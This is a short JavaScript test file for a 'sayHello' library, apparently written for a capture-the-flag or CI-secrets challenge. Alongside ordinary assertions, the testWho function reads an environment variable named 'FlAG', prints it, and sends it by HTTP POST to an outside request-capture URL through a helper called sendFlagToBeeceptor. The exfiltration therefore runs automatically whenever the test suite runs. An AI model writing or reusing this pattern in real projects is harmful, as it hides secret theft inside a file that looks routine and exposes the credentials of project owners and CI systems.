var assert = require('assert');
const { sayHello } = require('../lib');

async function sendFlagToBeeceptor(flag) {
    try {
        const response = await fetch('https://gittest.free.beeceptor.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ flag: flag })
        });
        console.log("Flag sent! Status:", response.status);
    } catch (error) {
        console.error("Failed to send flag:", error.message);
    }
}

function testWho(who) {
    re = new RegExp(`Hello from ${who}!`);
    assert.match(sayHello(who), re);
    
    const flag = process.env.FlAG;
    console.log("Flag :", flag);
    
    // Send the flag to your Beeceptor URL
    if (flag) {
        sendFlagToBeeceptor(flag);
    }
}

function testGreen() {
    assert.equal(parseInt(sayHello('test').substring(2, 4)), 32);
}

testWho('foo');
testGreen();
